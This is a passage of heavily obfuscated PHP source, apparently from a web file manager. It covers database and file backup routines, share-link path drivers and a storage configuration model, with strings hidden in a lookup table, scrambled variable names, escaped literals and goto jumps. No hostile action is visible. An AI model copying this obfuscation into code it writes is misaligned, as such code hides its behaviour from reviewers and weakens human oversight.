Model($_SERVER[‹è™Ü¸Ñ][803]); $ó—ŠØÁ = $…ö •ŠÙ->findByName(self::$name); $…ö •ŠÙ->parseContent($ó—ŠØÁ); self::$option = $ó—ŠØÁ; } return self::$option; } public static function set($øíıüº–) { $”×œó¿Á =& $_SERVER[‹è™Ü¸Ñ]; $îÊöôçæ = self::get(); foreach ($øíıüº– as $ßıâ¹Ö« => $Ú¾ºó¢Ô) { array_set_value($îÊöôçæ, $ßıâ¹Ö«, $Ú¾ºó¢Ô); } Model($”×œó¿Á[803])->update($îÊöôçæ[$”×œó¿Á[475]], $îÊöôçæ); self::$option = $îÊöôçæ; return self::$option; } public function keep() { $¶¬®ì³Ÿ =& $_SERVER[‹è™Ü¸Ñ]; $ş‘™Ş¤ = self::get(); if (_get($ş‘™Ş¤, $¶¬®ì³Ÿ[823], 0) == $¶¬®ì³Ÿ[91]) { return; } $this->backupKeep($ş‘™Ş¤); self::set(array($¶¬®ì³Ÿ[823] => 1)); } private function backupKeep($äÎŒÛƒÔ) { $Â«×Ë‘× =& $_SERVER[‹è™Ü¸Ñ]; if (self::$manual == 1) { return; } $³¤»¿± = $this->model->listData(); if (empty($³¤»¿±)) { return; } $Â½Ÿ’’¸ = 0; $”Òºä¬æ = array(); foreach ($³¤»¿± as $²ÊÈ¿éù) { if ($Â½Ÿ’’¸ >= 7) { break; } $”Òºä¬æ[] = $²ÊÈ¿éù[$Â«×Ë‘×[32]]; $Â½Ÿ’’¸++; } for ($Â½Ÿ’’¸ = 0; $Â½Ÿ’’¸ < 12; $Â½Ÿ’’¸++) { $”Òºä¬æ[] = date($Â«×Ë‘×[824], strtotime("\55{$Â½Ÿ’’¸}\40\155\x6f\156\164\x68\163")); } $”Òºä¬æ = array_unique($”Òºä¬æ); $† šÈÜ» = Model($Â«×Ë‘×[825])->get($Â«×Ë‘×[826]); foreach ($³¤»¿± as $²ÊÈ¿éù) { if (isset($²ÊÈ¿éù[$Â«×Ë‘×[810]]) && $²ÊÈ¿éù[$Â«×Ë‘×[810]] == $Â«×Ë‘×[91]) { continue; } if (!empty($²ÊÈ¿éù[$Â«×Ë‘×[32]]) && in_array($²ÊÈ¿éù[$Â«×Ë‘×[32]], $”Òºä¬æ)) { continue; } $this->model->remove($²ÊÈ¿éù[$Â«×Ë‘×[475]]); $–¿äü×³ = $this->backupPath($äÎŒÛƒÔ, $† šÈÜ»); IO::remove($–¿äü×³, !1); } } private function backupPath($ÎıÙ¿¶Ş, $—ìù­›¢ = false) { $¢Òí™² =& $_SERVER[‹è™Ü¸Ñ]; if (!$—ìù­›¢) { $—ìù­›¢ = Model($¢Òí™²[825])->get($¢Òí™²[826]); } $™Êî˜±š = $ÎıÙ¿¶Ş[$¢Òí™²[32]]; $‡»£÷÷¥ = substr(md5($¢Òí™²[827] . $—ìù­›¢ . $™Êî˜±š), 0, 8); return "\173\151\x6f\x3a{$ÎıÙ¿¶Ş[$¢Òí™²[807]]}\175\57\x64\x61\164\141\x62\141\x73\x65\57\x62\141\143\153\165\x70\57" . $™Êî˜±š . $¢Òí™²[11] . $‡»£÷÷¥; } public function db() { $¶‹çˆ€™ =& $_SERVER[‹è™Ü¸Ñ]; $êòâ³Ï„ = self::get(); if (_get($êòâ³Ï„, $¶‹çˆ€™[828], 0) == $¶‹çˆ€™[91]) { return !0; } $âûøö»å = new BackupDb(); if (!$âûøö»å->index()) { return !1; } self::set(array($¶‹çˆ€™[828] => 1)); return !0; } public function dbFile() { $ŠµÙŠĞ¹ =& $_SERVER[‹è™Ü¸Ñ]; $Ô‰…Ô¬“ = self::get(); if (_get($Ô‰…Ô¬“, $ŠµÙŠĞ¹[829], 0) == $ŠµÙŠĞ¹[91]) { return !0; } $˜â…ç¤Õ = new BackupDbFile(); if (!$˜â…ç¤Õ->index()) { return !1; } self::set(array($ŠµÙŠĞ¹[829] => 1)); return !0; } public function file() { $Í÷°ª¹ =& $_SERVER[‹è™Ü¸Ñ]; $±çŸèÅ = self::get(); if (_get($±çŸèÅ, $Í÷°ª¹[830], 0) == $Í÷°ª¹[91]) { return !0; } if ($±çŸèÅ[$Í÷°ª¹[171]] == $Í÷°ª¹[831]) { $ÁùŠÔ¾Ô = new BackupFile(); if (!$ÁùŠÔ¾Ô->index()) { return !1; } } self::set(array($Í÷°ª¹[830] => 1, $Í÷°ª¹[805] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $®¾ì‚æ =& $_SERVER[‹è™Ü¸Ñ]; $©á³ëÕ¾ = Backup::get(); self::$io = $©á³ëÕ¾[$®¾ì‚æ[807]]; self::$name = $©á³ëÕ¾[$®¾ì‚æ[32]]; $Ù’­Ä³± = new DbManage(); $»™óõ«€ = $Ù’­Ä³±->dbType(); $Å˜ó‘ÕÌ = array($®¾ì‚æ[832] => $»™óõ«€, $®¾ì‚æ[833] => time()); Backup::set($Å˜ó‘ÕÌ); $ŒÒóß³¶ = $this->tmpFilesPath() . $®¾ì‚æ[834] . self::$name . $®¾ì‚æ[8]; del_dir($ŒÒóß³¶); mk_dir($ŒÒóß³¶); $ÍòÂâùè = $¾•Œ‡÷ó = 0; try { $›„èŞë­ = $Ù’­Ä³±->db()->getTables(); } catch (Exception $±„Ê›è) { return !1; } $›„èŞë­ = array_diff($›„èŞë­, array($®¾ì‚æ[835], $®¾ì‚æ[836])); foreach ($›„èŞë­ as $ì«èÑ‰ë) { $ÍòÂâùè += $Ù’­Ä³±->model($ì«èÑ‰ë)->count(); } $ØÚş¦¾ƒ = new Task($®¾ì‚æ[837], $®¾ì‚æ[838], $ÍòÂâùè, LNG($®¾ì‚æ[839]) . $®¾ì‚æ[840] . LNG($®¾ì‚æ[841])); $GLOBALS[$®¾ì‚æ[842]] = self::$name; foreach ($›„èŞë­ as $ì«èÑ‰ë) { $¢şÅÚá = $ŒÒóß³¶ . $ì«èÑ‰ë . $®¾ì‚æ[843]; $şÎ“ßŒÏ = null; if ($ì«èÑ‰ë == $®¾ì‚æ[844] && (!isset($©á³ëÕ¾[$®¾ì‚æ[171]]) || $©á³ëÕ¾[$®¾ì‚æ[171]] == $®¾ì‚æ[228])) { $şÎ“ßŒÏ = self::$io; } $¾•Œ‡÷ó += $Ù’­Ä³±->sqlFromDb($ì«èÑ‰ë, $¢şÅÚá, $ØÚş¦¾ƒ, $şÎ“ßŒÏ); } unset($GLOBALS[$®¾ì‚æ[842]]); $ØÚş¦¾ƒ->end(); if ($¾•Œ‡÷ó > $ÍòÂâùè) { $ÍòÂâùè = $¾•Œ‡÷ó; } $Å˜ó‘ÕÌ = array($®¾ì‚æ[832] => $»™óõ«€, $®¾ì‚æ[828] => 1, $®¾ì‚æ[845] => $ÍòÂâùè, $®¾ì‚æ[846] => $¾•Œ‡÷ó, $®¾ì‚æ[847] => time()); Backup::set($Å˜ó‘ÕÌ); if ($ÍòÂâùè - $¾•Œ‡÷ó > 0) { $Ü˜ÓÓ¥¸ = $®¾ì‚æ[848]; if (!stristr(I18n::getType(), $®¾ì‚æ[849])) { $Ü˜ÓÓ¥¸ = $®¾ì‚æ[850]; } write_log(array($Ü˜ÓÓ¥¸, $Å˜ó‘ÕÌ), $®¾ì‚æ[838]); return !1; } return !0; } private function tmpFilesPath() { $¦›³ÄÀ =& $_SERVER[‹è™Ü¸Ñ]; $ªô€Á–‡ = TEMP_FILES; if ($GLOBALS[$¦›³ÄÀ[6]][$¦›³ÄÀ[92]][$¦›³ÄÀ[851]]) { $ªô€Á–‡ = $GLOBALS[$¦›³ÄÀ[6]][$¦›³ÄÀ[92]][$¦›³ÄÀ[851]]; if (!mk_dir($ªô€Á–‡) || !is_writable($ªô€Á–‡) || !IO::mkfile($ªô€Á–‡ . $¦›³ÄÀ[852])) { $ªô€Á–‡ = TEMP_FILES; } } return $ªô€Á–‡; } } class BackupDbFile { public function __construct() { } public function index() { $¸©¯ğÄ¡ =& $_SERVER[‹è™Ü¸Ñ]; $™ŒâĞ±à = Backup::get(); $÷Ï÷¨ğß = $™ŒâĞ±à[$¸©¯ğÄ¡[32]]; $°Íîä”¦ = $this->tmpFilesPath() . "\142\141\x63\153\x75\160\137{$÷Ï÷¨ğß}\x2f"; $Çªò•¶· = $this->backupPath($™ŒâĞ±à); if (!($Çªò•¶· = IO::mkdir($Çªò•¶·))) { return !1; } $ğ½™¥¼· = IO::listPath($°Íîä”¦); $«Â¸Ò’« = isset($ğ½™¥¼·[$¸©¯ğÄ¡[86]]) ? $ğ½™¥¼·[$¸©¯ğÄ¡[86]] : array(); $³„ÕÍ– = array_sum(array_column($«Â¸Ò’«, $¸©¯ğÄ¡[79])); if (!$³„ÕÍ–) { return !1; } $èŞøã†­ = array($¸©¯ğÄ¡[853] => $³„ÕÍ–, $¸©¯ğÄ¡[854] => time()); Backup::set($èŞøã†­); $Øêœ´è = new TaskFileTransfer($¸©¯ğÄ¡[855], $¸©¯ğÄ¡[838], count($«Â¸Ò’«), LNG($¸©¯ğÄ¡[839]) . $¸©¯ğÄ¡[462] . LNG($¸©¯ğÄ¡[841]) . $¸©¯ğÄ¡[856]); $Øêœ´è->task[$¸©¯ğÄ¡[818]] = $³„ÕÍ–; foreach ($ğ½™¥¼·[$¸©¯ğÄ¡[86]] as $øÇÀø˜„) { $¢ƒÏ›â = IO::move($øÇÀø˜„[$¸©¯ğÄ¡[87]], $Çªò•¶·); if (!$¢ƒÏ›â) { $Øêœ´è->end(); $¶…µ†úì = IO::getLastError($¸©¯ğÄ¡[857] . $øÇÀø˜„[$¸©¯ğÄ¡[87]] . $¸©¯ğÄ¡[858] . $Çªò•¶· . $¸©¯ğÄ¡[178]); write_log($¶…µ†úì, $¸©¯ğÄ¡[838]); return !1; } } $öŸŞËé = new DbManage(); $ÄÄ³êà  = $öŸŞËé->getSqlFile(); if (!$ÄÄ³êà [$¸©¯ğÄ¡[859]] || !$ÄÄ³êà [$¸©¯ğÄ¡[13]]) { return !1; } IO::move($ÄÄ³êà [$¸©¯ğÄ¡[859]], $Çªò•¶·); IO::move($ÄÄ³êà [$¸©¯ğÄ¡[13]], $Çªò•¶·); $Øêœ´è->end(); $èŞøã†­ = array($¸©¯ğÄ¡[860] => $³„ÕÍ–, $¸©¯ğÄ¡[861] => time()); Backup::set($èŞøã†­); return !0; } private function backupPath($ÀÚãÈ„) { $ƒ£Êû‘å =& $_SERVER[‹è™Ü¸Ñ]; $ö³øïƒ = $ÀÚãÈ„[$ƒ£Êû‘å[32]]; $âëàğØÂ = Model($ƒ£Êû‘å[825])->get($ƒ£Êû‘å[826]); $ÖáÏŒÑÍ = substr(md5($ƒ£Êû‘å[827] . $âëàğØÂ . $ö³øïƒ), 0, 8); return "\x7b\x69\157\72{$ÀÚãÈ„[$ƒ£Êû‘å[807]]}\175\x2f\144\x61\x74\141\x62\x61\163\x65\x2f\x62\x61\x63\x6b\165\x70\57" . $ö³øïƒ . $ƒ£Êû‘å[11] . $ÖáÏŒÑÍ; } private function tmpFilesPath() { $ÚÓçáòŸ =& $_SERVER[‹è™Ü¸Ñ]; $Ã×Ğ¡ºÍ = TEMP_FILES; if ($GLOBALS[$ÚÓçáòŸ[6]][$ÚÓçáòŸ[92]][$ÚÓçáòŸ[851]]) { $Ã×Ğ¡ºÍ = $GLOBALS[$ÚÓçáòŸ[6]][$ÚÓçáòŸ[92]][$ÚÓçáòŸ[851]]; if (!mk_dir($Ã×Ğ¡ºÍ) || !is_writable($Ã×Ğ¡ºÍ) || !IO::mkfile($Ã×Ğ¡ºÍ . $ÚÓçáòŸ[852])) { $Ã×Ğ¡ºÍ = TEMP_FILES; } } return $Ã×Ğ¡ºÍ; } } goto F£î¢Ò”ï¸; Dõ¥™İªƒÃ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($˜ÆÒæÈÃ) { $this->pathParse = $˜ÆÒæÈÃ; $this->model = Model($_SERVER[‹è™Ü¸Ñ][1398]); } protected function infoParse($ê÷ŒŠ‹, $•¯ƒ¦ƒƒ = false, $­¾»œ«˜ = false) { $™–ç«æ =& $_SERVER[‹è™Ü¸Ñ]; return Action($™–ç«æ[1236])->sharePathInfo($this->pathParse[$™–ç«æ[87]], !0, $•¯ƒ¦ƒƒ); } public function listPath($åö•Àºñ, $î›‹Ääš = false) { $µËÍõ† =& $_SERVER[‹è™Ü¸Ñ]; $ŸŒñó®ñ = parent::listPath($åö•Àºñ, $î›‹Ääš); if (!$ŸŒñó®ñ) { return $ŸŒñó®ñ; } if (is_array($ŸŒñó®ñ[$µËÍõ†[1406]])) { $ŸŒñó®ñ[$µËÍõ†[1406]] = Action($µËÍõ†[1236])->shareItemInfo($ŸŒñó®ñ[$µËÍõ†[1406]]); } foreach ($ŸŒñó®ñ as $Óû´àíä => $ÆÎßı—·) { if (!in_array($Óû´àíä, array($µËÍõ†[86], $µËÍõ†[85]))) { continue; } foreach ($ÆÎßı—· as $ÏéäºÍØ => $µÙ”Ù¦ú) { $ŸŒñó®ñ[$Óû´àíä][$ÏéäºÍØ] = Action($µËÍõ†[1236])->shareItemInfo($µÙ”Ù¦ú); } } return $ŸŒñó®ñ; } public function listAll($à´—ş˜„) { $æÉÓ¤òº =& $_SERVER[‹è™Ü¸Ñ]; $Ø™Ğõ = IO::info($this->pathParse[$æÉÓ¤òº[87]]); if (!$Ø™Ğõ) { return array(); } $â‹Êø¬Ğ = $this->model->listAll($à´—ş˜„); foreach ($â‹Êø¬Ğ as &$‚§¯Ï¶£) { $‚§¯Ï¶£[$æÉÓ¤òº[90]] = Action($æÉÓ¤òº[1236])->shareItemInfo($‚§¯Ï¶£[$æÉÓ¤òº[90]]); } unset($‚§¯Ï¶£); return $â‹Êø¬Ğ; } } class PathDriverDriverShareItem { public function __construct($ÎË‹ÚÑ«) { $this->pathParse = $ÎË‹ÚÑ«; } public function __call($Á¥œúùõ, $ÏÙı»´Æ) { $æØö´„ó =& $_SERVER[‹è™Ü¸Ñ]; if (method_exists($this, $Á¥œúùõ)) { return; } $ä¸¥ğ„ = call_user_func_array(array($æØö´„ó[1407], $Á¥œúùõ), $ÏÙı»´Æ); $ôîò´÷ = array($æØö´„ó[1408], $æØö´„ó[1409], $æØö´„ó[1410], $æØö´„ó[1411], $æØö´„ó[618], $æØö´„ó[620], $æØö´„ó[1412], $æØö´„ó[110], $æØö´„ó[1413], $æØö´„ó[1414]); if (in_array($Á¥œúùõ, $ôîò´÷)) { $ä¸¥ğ„ = $this->getPathOuter($ä¸¥ğ„); } return $ä¸¥ğ„; } public function copy($şŒ¡ò½ƒ, $ã¹•ºÓ™, $ÀåÓÈŠ˜ = false, $°·ëé­ = false) { return $this->copyMove($şŒ¡ò½ƒ, $ã¹•ºÓ™, $ÀåÓÈŠ˜, $_SERVER[‹è™Ü¸Ñ][618], $°·ëé­); } public function move($Ñ›´¾¨Ã, $ÀÎŠÍÊ÷, $Í²—ò± = false, $õÛÊÖÑÌ = false) { return $this->copyMove($Ñ›´¾¨Ã, $ÀÎŠÍÊ÷, $Í²—ò±, $_SERVER[‹è™Ü¸Ñ][620], $õÛÊÖÑÌ); } private function copyMove($€ö¡¶ , $ÎØÈ§Ğì, $€ª®Õøã, $ÏŞé¸—³, $»ö©ß×™ = false) { $ñ¢¡¬ò’ =& $_SERVER[‹è™Ü¸Ñ]; $ÛŠî±á… = $ÎØÈ§Ğì; $‰úÚÙİâ = IO::driverMake($ÎØÈ§Ğì); if ($‰úÚÙİâ->pathParse[$ñ¢¡¬ò’[1212]]) { $ÎØÈ§Ğì = $‰úÚÙİâ->pathParse[$ñ¢¡¬ò’[1212]]; } else { $ÎØÈ§Ğì = $ÛŠî±á…; } $Õ±ùòÅ¸ = IO::copyMove($€ö¡¶ , $ÎØÈ§Ğì, $€ª®Õøã, $ÏŞé¸—³, $»ö©ß×™); $Õ±ùòÅ¸ = $this->getPathOuter($Õ±ùòÅ¸); return $Õ±ùòÅ¸; } public function pathThis($ÈäŞÇ„®) { return get_path_this($this->pathParse[$_SERVER[‹è™Ü¸Ñ][87]]); } public function pathFather($áÍÙ«ø) { return get_path_father($this->pathParse[$_SERVER[‹è™Ü¸Ñ][87]]); } public function iconvSystem($²ããŸ½Š) { return $²ããŸ½Š; } protected function infoParse($úÍÖâÂÛ, $á·®šÒÂ = false) { $ï¿÷…şâ =& $_SERVER[‹è™Ü¸Ñ]; $„‰Ú•‡£ = $this->pathParse[$ï¿÷…şâ[560]][$ï¿÷…şâ[1237]] . $this->pathParse[$ï¿÷…şâ[1230]]; if ($á·®šÒÂ) { $©ç± ìÈ = IO::infoWithChildren($„‰Ú•‡£); } else { $©ç± ìÈ = IO::info($„‰Ú•‡£); } $»À£Ë¢¡ = $this->pathParse[$ï¿÷…şâ[560]]; return Action($ï¿÷…şâ[1405])->_shareItemeParse($©ç± ìÈ, $»À£Ë¢¡); } public function listAll($±˜›ïıÎ) { $û« à =& $_SERVER[‹è™Ü¸Ñ]; $úš¼Û´ = IO::listAll($±˜›ïıÎ); $ØÆ»¨€å = rtrim($this->pathParse[$û« à[560]][$û« à[1237]], $û« à[8]); foreach ($úš¼Û´ as &$¤²¡¥¯µ) { $¤²¡¥¯µ[$û« à[87]] = $this->pathDriver . $û« à[8] . ltrim(substr($¤²¡¥¯µ[$û« à[87]], strlen($ØÆ»¨€å)), $û« à[8]); } unset($¤²¡¥¯µ); return $úš¼Û´; } public function listAllSimple($áãä¤À, $óùŞ‘˜ = false) { $ªÂÄ›· =& $_SERVER[‹è™Ü¸Ñ]; $ÂÚ“ïã = $this->listAll($áãä¤À); $ÇÊ®á÷ = $this->pathParse[$ªÂÄ›·[495]]; if (trim($ÇÊ®á÷, $ªÂÄ›·[8]) == trim(get_path_father($ÇÊ®á÷), $ªÂÄ›·[8])) { $óùŞ‘˜ = !0; } return IO::init($ªÂÄ›·[12])->listAllSimpleMake($ÂÚ“ïã, $ÇÊ®á÷, $óùŞ‘˜); } public function getPathOuter($ôĞé”´¢) { $ïÙ¡ûŠ =& $_SERVER[‹è™Ü¸Ñ]; $°™‡²© = KodIO::parse($ôĞé”´¢); if ($°™‡²©[$ïÙ¡ûŠ[33]] == KodIO::KOD_SHARE_ITEM) { return $°™‡²©[$ïÙ¡ûŠ[87]]; } $š…¨­úñ = KodIO::clear($ôĞé”´¢); $Òë£ä§õ = KodIO::clear($this->pathParse[$ïÙ¡ûŠ[560]][$ïÙ¡ûŠ[1237]]); $é»“êı  = substr($š…¨­úñ, strlen($Òë£ä§õ)); if (substr($š…¨­úñ, 0, strlen($Òë£ä§õ)) != $Òë£ä§õ) { return !1; } return $this->pathParse[$ïÙ¡ûŠ[1231]] . $ïÙ¡ûŠ[8] . ltrim($é»“êı , $ïÙ¡ûŠ[8]); } public function getType() { $¶·–¦¢ =& $_SERVER[‹è™Ü¸Ñ]; $èœ³§Êª = str_replace($¶·–¦¢[77], $¶·–¦¢[12], get_class($this)); return strtolower($èœ³§Êª); } public function isOsDriver($•¾“öÇä) { return IO::isOsDriver($•¾“öÇä); } public function info($«…È´¶) { return $this->infoParse($«…È´¶); } public function infoAuth($é”§‡×æ) { return $this->infoParse($é”§‡×æ); } public function infoWithChildren($ÖüÊÉÒá) { return $this->infoParse($ÖüÊÉÒá, !0); } public function infoFull($÷å´¹—‰) { return $this->infoParse($÷å´¹—‰); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($×¤Õ®ï) { $this->pathParse = $×¤Õ®ï; } protected function infoParse($çı¦ŠÁ, $ıÕµšÎä = false) { $”œÓÔÇ =& $_SERVER[‹è™Ü¸Ñ]; return Action($”œÓÔÇ[1236])->sharePathInfo($this->pathParse[$”œÓÔÇ[87]], !0, $ıÕµšÎä); } public function listPath($¥ë–Á, $›ô’›‰ = false) { $ôîÎ¸ºØ =& $_SERVER[‹è™Ü¸Ñ]; $‹¹·ïı‘ = IO::listPath($¥ë–Á, $›ô’›‰); if (!$‹¹·ïı‘) { return $‹¹·ïı‘; } if (is_array($‹¹·ïı‘[$ôîÎ¸ºØ[1406]])) { $æ•‘Îº‹ = Action($ôîÎ¸ºØ[1415])->parsePathChildren($‹¹·ïı‘[$ôîÎ¸ºØ[1406]], array($ôîÎ¸ºØ[495] => $¥ë–Á)); $‹¹·ïı‘[$ôîÎ¸ºØ[1406]] = Action($ôîÎ¸ºØ[1236])->shareItemInfo($æ•‘Îº‹); } foreach ($‹¹·ïı‘ as $Óæí²âÆ => $¬ØİÁğ®) { if (!in_array($Óæí²âÆ, array($ôîÎ¸ºØ[86], $ôîÎ¸ºØ[85]))) { continue; } foreach ($¬ØİÁğ® as $üÙ±şÎ› => $æ•‘Îº‹) { $æ•‘Îº‹ = Action($ôîÎ¸ºØ[1415])->parsePathChildren($æ•‘Îº‹, array($ôîÎ¸ºØ[495] => $¥ë–Á)); $‹¹·ïı‘[$Óæí²âÆ][$üÙ±şÎ›] = Action($ôîÎ¸ºØ[1236])->shareItemInfo($æ•‘Îº‹); } } return $‹¹·ïı‘; } } goto EÇˆÃæÑğ–; Dé‹¯‰Ê–: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\56\x73\x74\x6f\162\x61\x67\145\114\x69\x73\x74"; public $field = array("\156\x61\155\x65", "\163\151\172\x65\115\141\170", "\163\171\163\164\x65\155", "\x64\145\x66\141\x75\154\x74", "\144\162\x69\x76\145\162", "\143\157\x6e\146\x69\x67"); public function listData($¿ŒƒÀ½ã = false, $Œù©µ¬Š = "\x6d\157\144\x69\146\171\x54\x69\x6d\x65", $ë¹ƒÚ¾± = false) { $–œ¢¡÷ =& $_SERVER[‹è™Ü¸Ñ]; $ã¹£‚Õ¤ = parent::listData($¿ŒƒÀ½ã, $Œù©µ¬Š, $ë¹ƒÚ¾±); if ($¿ŒƒÀ½ã) { return $ã¹£‚Õ¤; } $¾ Õ”¯İ = array(); if ($GLOBALS[$–œ¢¡÷[2279]]) { $¾ Õ”¯İ = $this->ioSizeUseGet(array_to_keyvalue($ã¹£‚Õ¤, $–œ¢¡÷[12], $–œ¢¡÷[475])); } foreach ($ã¹£‚Õ¤ as $ÄÈ°·Î¼ => $­øÔÎ²š) { unset($ã¹£‚Õ¤[$ÄÈ°·Î¼][$–œ¢¡÷[6]]); $ã¹£‚Õ¤[$ÄÈ°·Î¼][$–œ¢¡÷[1939]] = isset($¾ Õ”¯İ[$­øÔÎ²š[$–œ¢¡÷[475]]]) ? $¾ Õ”¯İ[$­øÔÎ²š[$–œ¢¡÷[475]]] : 0; } return $ã¹£‚Õ¤; } public function ioSizeUseGet($ı»åˆ¾) { $îâò¬ª =& $_SERVER[‹è™Ü¸Ñ]; if (!$ı»åˆ¾) { return array(); } $ÍÂÎ†§ø = $îâò¬ª[2280] . implode($îâò¬ª[50], $ı»åˆ¾); $ÜòÍ˜èí = Cache::get($ÍÂÎ†§ø); if ($ÜòÍ˜èí) { return $ÜòÍ˜èí; } $ô”Õ×¬ = array($îâò¬ª[872] => $îâò¬ª[475], $îâò¬ª[2281] => $îâò¬ª[79]); $´î‡ëô = array($îâò¬ª[872] => array($îâò¬ª[7], $ı»åˆ¾)); $ÜòÍ˜èí = Model($îâò¬ª[844])->field($ô”Õ×¬)->where($´î‡ëô)->group($îâò¬ª[872])->select(); $ÜòÍ˜èí = array_to_keyvalue($ÜòÍ˜èí, $îâò¬ª[475], $îâò¬ª[79]); Cache::set($ÍÂÎ†§ø, $ÜòÍ˜èí, 600); return $ÜòÍ˜èí; } public function getConfig($µ—™‰Â) { $ïµµñÓ = parent::listData($µ—™‰Â); return json_decode($ïµµñÓ[$_SERVER[‹è™Ü¸Ñ][6]], !0); } public function update($Ü×ÔéÓ, $™éÔ÷Ü…) { $ä‰ƒä»Ø =& $_SERVER[‹è™Ü¸Ñ]; $¢ªêáô = $™éÔ÷Ü…[$ä‰ƒä»Ø[32]]; $¿À…óş = array_to_keyvalue(parent::listData(), $ä‰ƒä»Ø[32]); if (isset($¿À…óş[$¢ªêáô]) && $¿À…óş[$¢ªêáô][$ä‰ƒä»Ø[475]] != $Ü×ÔéÓ) { return !1; } $this->checkPwd($Ü×ÔéÓ, $™éÔ÷Ü…); if (isset($™éÔ÷Ü…[$ä‰ƒä»Ø[2282]]) && $™éÔ÷Ü…[$ä‰ƒä»Ø[2282]] == $ä‰ƒä»Ø[91]) { $this->checkConfig($™éÔ÷Ü…); } unset($™éÔ÷Ü…[$ä‰ƒä»Ø[2282]]); $ÈêËÈ¦ = parent::update($Ü×ÔéÓ, $™éÔ÷Ü…); if ($ÈêËÈ¦ && $™éÔ÷Ü…[$ä‰ƒä»Ø[37]]) { $™ÃÔ» ç = 0; foreach ($¿À…óş as $ÖæìÕÁË) { if ($ÖæìÕÁË[$ä‰ƒä»Ø[37]] && $ÖæìÕÁË[$ä‰ƒä»Ø[475]] != $Ü×ÔéÓ) { $™ÃÔ» ç = $ÖæìÕÁË[$ä‰ƒä»Ø[475]]; parent::update($ÖæìÕÁË[$ä‰ƒä»Ø[475]], array($ä‰ƒä»Ø[37] => 0)); } } $this->updateBackup($Ü×ÔéÓ, $™ÃÔ» ç); } return $ÈêËÈ¦; } public function add($ç‚ûØÛ) { $×ß™¤ÆÅ =& $_SERVER[‹è™Ü¸Ñ]; $Åˆ†™— = array_to_keyvalue(parent::listData(), $×ß™¤ÆÅ[32]); if (isset($Åˆ†™—[$ç‚ûØÛ[$×ß™¤ÆÅ[32]]])) { return !1; } $this->checkConfig($ç‚ûØÛ); $·Æ¤òñô = parent::insert($ç‚ûØÛ); if ($·Æ¤òñô && $ç‚ûØÛ[$×ß™¤ÆÅ[37]]) { foreach ($Åˆ†™— as $ÓÅ›øŠ) { if ($ÓÅ›øŠ[$×ß™¤ÆÅ[37]]) { parent::update($ÓÅ›øŠ[$×ß™¤ÆÅ[475]], array($×ß™¤ÆÅ[37] => 0)); } } } return $·Æ¤òñô; } public function updateBackup($ÖŠ½¬®Û, $”¤ßÄ”²) { $àÙñüËµ =& $_SERVER[‹è™Ü¸Ñ]; if (!$”¤ßÄ”²) { return; } $•¾ò‡ìŞ = Model($àÙñüËµ[803])->config(); if ($•¾ò‡ìŞ[$àÙñüËµ[1722]] != $àÙñüËµ[91] || $•¾ò‡ìŞ[$àÙñüËµ[807]] != $”¤ßÄ”²) { return; } $½ÍØ‘• = Model($àÙñüËµ[825])->get($àÙñüËµ[838]); $½ÍØ‘• = json_decode($½ÍØ‘•, !0); if (!$½ÍØ‘•) { return; } $½ÍØ‘•[$àÙñüËµ[807]] = $ÖŠ½¬®Û; Model($àÙñüËµ[825])->set(array($àÙñüËµ[838] => $½ÍØ‘•)); } public function checkPwd($Öáê¥÷î, &$Üİ…ã) { $˜»Ö†Å¦ =& $_SERVER[‹è™Ü¸Ñ]; if (empty($Üİ…ã[$˜»Ö†Å¦[6]])) { return; } $«ÛÉÜÁÄ = json_decode($Üİ…ã[$˜»Ö†Å¦[6]], !0); $ìşîƒú¸ = $˜»Ö†Å¦[12]; $ÚÆ¯‡İ‚ = array($˜»Ö†Å¦[2283], $˜»Ö†Å¦[2284], $˜»Ö†Å¦[947]); foreach ($ÚÆ¯‡İ‚ as $İç«ÅÌœ) { if (isset($«ÛÉÜÁÄ[$İç«ÅÌœ])) { $ìşîƒú¸ = $İç«ÅÌœ; break; } } if (!$ìşîƒú¸) { return; } $ß„¤î¬¤ = $this->getConfig($Öáê¥÷î); $œ¼ëº½¾ = $ß„¤î¬¤[$ìşîƒú¸]; $´ß„ùê” = $«ÛÉÜÁÄ[$ìşîƒú¸]; if ($´ß„ùê” == str_repeat($˜»Ö†Å¦[220], strlen($œ¼ëº½¾))) { $«ÛÉÜÁÄ[$ìşîƒú¸] = $œ¼ëº½¾; $Üİ…ã[$˜»Ö†Å¦[6]] = json_encode($«ÛÉÜÁÄ); } else { if ($´ß„ùê” != $œ¼ëº½¾) { $Üİ…ã[$˜»Ö†Å¦[2282]] = $˜»Ö†Å¦[91]; } } } public function checkConfig(&$Åé–‹ìã, $½ Ìì‰– = false) { $ßÕÄ¿Í =& $_SERVER[‹è™Ü¸Ñ]; $Ğ¨üˆ³  = strtolower($Åé–‹ìã[$ßÕÄ¿Í[98]]); $¥´ìûëœ = json_decode($Åé–‹ìã[$ßÕÄ¿Í[6]], !0); foreach ($¥´ìûëœ as $š•«ĞÙ => $ûÓ§§‘¹) { if (is_string($ûÓ§§‘¹)) { $¥´ìûëœ[$š•«ĞÙ] = trim($ûÓ§§‘¹); } } $¥´ìûëœ[$ßÕÄ¿Í[2285]] = rand_string(6); $Õ¸¾´§ = $GLOBALS[$ßÕÄ¿Í[6]][$ßÕÄ¿Í[92]][$ßÕÄ¿Í[880]]; $Ş†ª—«¸ = isset($Õ¸¾´§[$Ğ¨üˆ³ ]) ? $Õ¸¾´§[$Ğ¨üˆ³ ] : ucfirst($Ğ¨üˆ³ ); $ÌÈ´Ğ± = $ßÕÄ¿Í[77] . $Ş†ª—«¸; if (!$Ş†ª—«¸ || !class_exists($ÌÈ´Ğ±)) { if ($½ Ìì‰–) { return LNG($ßÕÄ¿Í[2286]); } write_log(array($ßÕÄ¿Í[2287], $Åé–‹ìã, get_caller_info()), $ßÕÄ¿Í[215]); show_json(LNG($ßÕÄ¿Í[2286]), !1, $Åé–‹ìã); } $óòøó = new $ÌÈ´Ğ±($¥´ìûëœ); if (in_array($Ğ¨üˆ³ , $óòøó->objectDriver)) { try { if (!$óòøó->isBucketCors() && !$óòøó->setBucketCors()) { $Ö²âÙÉ¸ = LNG($ßÕÄ¿Í[2288]); $Ö²âÙÉ¸ .= $ßÕÄ¿Í[2289] . LNG($ßÕÄ¿Í[2290]); } } catch (Exception $ğŞ«ìÛ§) { $Ö²âÙÉ¸ = $ğŞ«ìÛ§->getMessage(); } if (isset($Ö²âÙÉ¸)) { return 